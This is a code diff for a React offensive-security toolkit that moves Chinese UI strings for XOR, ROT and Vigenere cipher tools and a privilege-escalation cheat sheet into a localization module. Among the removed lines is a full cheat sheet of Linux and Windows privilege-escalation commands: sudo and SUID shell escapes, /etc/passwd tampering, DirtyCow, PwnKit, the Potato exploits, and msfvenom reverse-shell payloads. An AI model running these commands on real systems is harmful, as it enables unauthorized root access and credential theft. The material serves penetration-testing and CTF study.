@@ -1,5 +1,7 @@
 import React, { useState, useMemo } from 'react'
 import { Panel, Btn, TA, Input, Select, ErrorNote, CopyBtn } from '../components/ui'
+import { useLocalized } from '../lib/i18n'
+import { offsecL } from '../lib/locales/offsec'
 
 /* ================= XOR ================= */
 
@@ -18,6 +20,7 @@ const fromHex = (s: string): Uint8Array => {
 }
 
 export function XorTool() {
+  const l = useLocalized(offsecL).xor
   const [input, setInput] = useState('flag{xor_1s_fun}')
   const [key, setKey] = useState('key')
   const [keyIsHex, setKeyIsHex] = useState(false)
@@ -32,40 +35,40 @@ export function XorTool() {
       let printable = ''
       try {
         printable = new TextDecoder('utf-8', { fatal: true }).decode(out)
-      } catch { printable = '(非可打印输出，请看 Hex)' }
+      } catch { printable = l.nonPrintable }
       return { hex: toHex(out), text: printable }
     } catch (e) {
       return { error: (e as Error).message }
     }
-  }, [input, key, keyIsHex, inputIsHex])
+  }, [input, key, keyIsHex, inputIsHex, l])
 
   return (
     <div className="space-y-3">
-      <TA value={input} onChange={setInput} label="输入数据" rows={4} />
+      <TA value={input} onChange={setInput} label={l.input} rows={4} />
       <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-        <Input value={key} onChange={setKey} label="XOR 密钥" placeholder="key 或 6b6579" />
+        <Input value={key} onChange={setKey} label={l.key} placeholder="key or 6b6579" />
         <div className="flex items-end gap-4 pb-1.5">
           <label className="flex items-center gap-1.5 text-[12px] text-muted cursor-pointer">
-            <input type="checkbox" checked={inputIsHex} onChange={e => setInputIsHex(e.target.checked)} className="accent-phosphor" /> 输入是 Hex
+            <input type="checkbox" checked={inputIsHex} onChange={e => setInputIsHex(e.target.checked)} className="accent-phosphor" /> {l.inputHex}
           </label>
           <label className="flex items-center gap-1.5 text-[12px] text-muted cursor-pointer">
-            <input type="checkbox" checked={keyIsHex} onChange={e => setKeyIsHex(e.target.checked)} className="accent-phosphor" /> 密钥是 Hex
+            <input type="checkbox" checked={keyIsHex} onChange={e => setKeyIsHex(e.target.checked)} className="accent-phosphor" /> {l.keyHex}
           </label>
         </div>
       </div>
       {result && 'error' in result && <ErrorNote msg={result.error!} />}
       {result && !('error' in result) && (
         <div className="space-y-2">
-          <TA value={result.text} readOnly label="文本结果" rows={3} />
-          <TA value={result.hex} readOnly label="Hex 结果" rows={2} />
+          <TA value={result.text} readOnly label={l.textResult} rows={3} />
+          <TA value={result.hex} readOnly label={l.hexResult} rows={2} />
         </div>
       )}
-      <p className="text-[11px] text-muted">* XOR 是可逆运算：同一密钥再异或一次即还原。循环使用密钥（Vernam 变体）。</p>
+      <p className="text-[11px] text-muted">{l.note}</p>
     </div>
   )
 }
 
-/* ================= ROT / 凯撒 ================= */
+/* ================= ROT / Caesar ================= */
 
 function caesar(s: string, shift: number): string {
   return s.split('').map(c => {
@@ -83,6 +86,7 @@ function rot47(s: string): string {
 }
 
 export function RotTool() {
+  const l = useLocalized(offsecL).rot
   const [input, setInput] = useState('Uryyb Jbeyq')
   const [shift, setShift] = useState('13')
   const [brute, setBrute] = useState(false)
@@ -96,18 +100,18 @@ export function RotTool() {
 
   return (
     <div className="space-y-3">
-      <TA value={input} onChange={setInput} label="输入" rows={4} />
+      <TA value={input} onChange={setInput} label={l.input} rows={4} />
       <div className="flex gap-3 items-end flex-wrap">
-        <Input value={shift} onChange={setShift} label="位移量 (1-25)" type="number" className="w-36" />
-        <Btn variant="primary" onClick={() => {}} disabled className="invisible">占位</Btn>
+        <Input value={shift} onChange={setShift} label={l.shift} type="number" className="w-36" />
+        <Btn variant="primary" onClick={() => {}} disabled className="invisible">{l.placeholder}</Btn>
         <label className="flex items-center gap-1.5 text-[12px] text-muted cursor-pointer pb-1.5">
-          <input type="checkbox" checked={brute} onChange={e => setBrute(e.target.checked)} className="accent-phosphor" /> 爆破全部 25 种位移
+          <input type="checkbox" checked={brute} onChange={e => setBrute(e.target.checked)} className="accent-phosphor" /> {l.brute}
         </label>
       </div>
       {!brute && (
         <div className="space-y-2">
-          <TA value={output} readOnly label={`凯撒位移 ${shift}（ROT13 即位移 13，自逆）`} rows={3} />
-          <TA value={r47} readOnly label="ROT47（覆盖全部可打印 ASCII，自逆）" rows={2} />
+          <TA value={output} readOnly label={l.caesar(shift)} rows={3} />
+          <TA value={r47} readOnly label={l.rot47} rows={2} />
         </div>
       )}
       {brute && bruteList && (
@@ -124,7 +128,7 @@ export function RotTool() {
   )
 }
 
-/* ================= 维吉尼亚 ================= */
+/* ================= Vigenere ================= */
 
 function vigenere(text: string, key: string, decrypt = false): string {
   const k = key.toLowerCase().replace(/[^a-z]/g, '')
@@ -144,6 +148,7 @@ function vigenere(text: string, key: string, decrypt = false): string {
 }
 
 export function VigenereTool() {
+  const l = useLocalized(offsecL).vigenere
   const [input, setInput] = useState('ATTACKATDAWN')
   const [key, setKey] = useState('LEMON')
   const [output, setOutput] = useState('')
@@ -156,95 +161,36 @@ export function VigenereTool() {
 
   return (
     <div className="space-y-3">
-      <TA value={input} onChange={setInput} label="文本（仅处理 a-z，忽略其他字符）" rows={4} />
-      <Input value={key} onChange={setKey} label="密钥（字母）" placeholder="LEMON" />
+      <TA value={input} onChange={setInput} label={l.input} rows={4} />
+      <Input value={key} onChange={setKey} label={l.key} placeholder="LEMON" />
       <div className="flex gap-2">
-        <Btn variant="primary" onClick={() => run('enc')}>加密</Btn>
-        <Btn onClick={() => run('dec')}>解密</Btn>
+        <Btn variant="primary" onClick={() => run('enc')}>{l.enc}</Btn>
+        <Btn onClick={() => run('dec')}>{l.dec}</Btn>
       </div>
-      {output && <TA value={output} readOnly label={mode === 'enc' ? '密文' : '明文'} rows={3} />}
-      <p className="text-[11px] text-muted">* 经典多表替换密码（1553年），曾被称为"不可破译的密码"，1863 年被 Kasiski 检验攻破。</p>
+      {output && <TA value={output} readOnly label={mode === 'enc' ? l.cipher : l.plain} rows={3} />}
+      <p className="text-[11px] text-muted">{l.note}</p>
     </div>
   )
 }
 
-/* ================= 提权速查 ================= */
-
-type PrivGroup = { name: string; items: { label: string; cmd: string; note?: string }[] }
-
-const PRIVESC: PrivGroup[] = [
-  {
-    name: 'Linux · 信息收集',
-    items: [
-      { label: '一键枚举', cmd: `linpeas.sh | tee /tmp/lp.txt`, note: 'LinPEAS 全面枚举' },
-      { label: '内核与发行版', cmd: `uname -a && cat /etc/os-release` },
-      { label: 'sudo 权限', cmd: `sudo -l`, note: '重点找 NOPASSWD 与通配符' },
-      { label: 'SUID 文件', cmd: `find / -perm -4000 -type f 2>/dev/null` },
-      { label: 'SGID 文件', cmd: `find / -perm -2000 -type f 2>/dev/null` },
-      { label: '可写关键文件', cmd: `find /etc -writable -type f 2>/dev/null` },
-      { label: '计划任务', cmd: `cat /etc/crontab; ls -la /etc/cron.d/` },
-      { label: 'capabilities', cmd: `getcap -r / 2>/dev/null`, note: 'cap_setuid 类等同 root' },
-      { label: '历史命令中的密码', cmd: `cat ~/.bash_history | grep -iE "pass|mysql|ssh"` },
-    ],
-  },
-  {
-    name: 'Linux · 常见利用',
-    items: [
-      { label: 'sudo find 提权', cmd: `sudo find . -exec /bin/sh \\; -quit`, note: 'find 在 sudo -l 中' },
-      { label: 'sudo vim 提权', cmd: `sudo vim -c ':!/bin/sh'` },
-      { label: 'sudo awk 提权', cmd: `sudo awk 'BEGIN {system("/bin/sh")}'` },
-      { label: 'sudo nmap 提权', cmd: `echo "os.execute('/bin/sh')" > /tmp/x.nse && sudo nmap --script=/tmp/x.nse` },
-      { label: 'SUID bash', cmd: `./bash -p`, note: '-p 保留 euid' },
-      { label: 'SUID python', cmd: `./python -c 'import os; os.setuid(0); os.system("/bin/sh")'` },
-      { label: '可写 /etc/passwd', cmd: `openssl passwd -1 'hacked'  # 生成哈希后写入 root 行`, note: '或新增 uid=0 用户' },
-      { label: 'cron 通配符注入', cmd: `echo 'chmod u+s /bin/bash' > /tmp/run.sh`, note: 'root 定时任务执行可写脚本' },
-      { label: 'NFS no_root_squash', cmd: `showmount -e <ip>  # 挂载后放 SUID 二进制` },
-      { label: 'DirtyCow (CVE-2016-5195)', cmd: `./dirty /usr/bin/passwd`, note: '内核 2.6.22 ~ 4.8.3' },
-      { label: 'PwnKit (CVE-2021-4034)', cmd: `./PwnKit`, note: 'polkit pkexec，影响面极广' },
-    ],
-  },
-  {
-    name: 'Windows · 信息收集',
-    items: [
-      { label: '一键枚举', cmd: `winPEASx64.exe`, note: 'WinPEAS' },
-      { label: '系统信息', cmd: `systeminfo | findstr /B /C:"OS"`, note: '找缺失补丁' },
-      { label: '当前权限', cmd: `whoami /all`, note: '关注 SeImpersonate 等特权' },
-      { label: '未加引号服务路径', cmd: `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"`, note: 'Unquoted Service Path' },
-      { label: '可修改的服务', cmd: `accesschk.exe -uwcqv "Authenticated Users" * /accepteula` },
-      { label: '注册表自动运行', cmd: `reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` },
-      { label: '存储的凭据', cmd: `cmdkey /list` },
-      { label: 'AlwaysInstallElevated', cmd: `reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`, note: '值为 1 则 msi 以 SYSTEM 安装' },
-    ],
-  },
-  {
-    name: 'Windows · 常见利用',
-    items: [
-      { label: 'PrintSpoofer', cmd: `PrintSpoofer64.exe -i -c cmd`, note: '需 SeImpersonate（服务账户常见）' },
-      { label: 'JuicyPotato', cmd: `JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *`, note: 'Win 2016/10 之前' },
-      { label: 'GodPotato', cmd: `GodPotato.exe -cmd "cmd /c whoami"`, note: 'Win 2012-2022 通用' },
-      { label: 'RoguePotato', cmd: `RoguePotato.exe -r <攻击机IP> -e rev.exe -l 9999`, note: 'PrintSpooler 被禁用时' },
-      { label: '服务路径注入', cmd: `icacls "C:\\Program Files\\Svc Dir\\"  # 在空格处放 Program.exe`, note: '配合未加引号服务路径' },
-      { label: 'DLL 劫持', cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=443 -f dll > hijack.dll` },
-      { label: 'msi 提权', cmd: `msfvenom -p windows/x64/shell_reverse_tcp -f msi > evil.msi && msiexec /quiet /qn /i evil.msi`, note: 'AlwaysInstallElevated' },
-    ],
-  },
-]
+/* ================= Privesc Cheat Sheet ================= */
 
 export function PrivescTool() {
+  const l = useLocalized(offsecL).privesc
   const [filter, setFilter] = useState('')
   const filtered = useMemo(() => {
-    if (!filter.trim()) return PRIVESC
+    if (!filter.trim()) return l.groups
     const q = filter.toLowerCase()
-    return PRIVESC.map(g => ({
+    return l.groups.map(g => ({
       ...g,
       items: g.items.filter(i =>
         i.label.toLowerCase().includes(q) || i.cmd.toLowerCase().includes(q) || (i.note || '').toLowerCase().includes(q)),
     })).filter(g => g.items.length > 0)
-  }, [filter])
+  }, [filter, l])
 
   return (
     <div className="space-y-3">
-      <Input value={filter} onChange={setFilter} label="筛选" placeholder="sudo / potato / suid / cron..." />
+      <Input value={filter} onChange={setFilter} label={l.filter} placeholder="sudo / potato / suid / cron..." />
       {filtered.map(g => (
         <Panel key={g.name} title={g.name}>
           <div className="space-y-1.5">
@@ -260,7 +206,7 @@ export function PrivescTool() {
           </div>
         </Panel>
       ))}
-      {filtered.length === 0 && <ErrorNote msg="没有匹配的条目" />}
+      {filtered.length === 0 && <ErrorNote msg={l.noMatch} />}
     </div>
   )
 }
